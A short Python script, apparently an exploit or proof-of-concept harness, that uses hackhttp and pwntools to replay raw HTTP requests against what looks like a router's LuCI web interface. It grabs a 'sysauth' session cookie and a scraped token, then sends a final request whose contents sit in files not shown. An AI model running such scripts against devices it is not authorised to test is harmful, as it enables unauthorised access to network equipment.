import hackhttp.hackhttp as hackhttp
from pwn import success, info, warning, error, pause

hh = hackhttp.hackhttp()
hh.via_eth("en0")
hh.globals.kwargs.update({"verify":False, "allow_redirects":False})

resp = hh.load_raw("messages/neri.txt").send()
sysauth = resp.cookies_dict['sysauth']
success(f"sysauth: {sysauth}")
hh.globals.cookies.update({"sysauth":sysauth}) 


resp = hh.load_raw("messages/neri2.txt").send()
token = resp.text.split('"token":"')[-1].split('"')[0]
success(f"token: {token}")


req = hh.load_raw("messages/neri3.txt")
req.data["token"] = token
resp = req.send()


success(str(resp))
info(resp.text)

hh.s.close()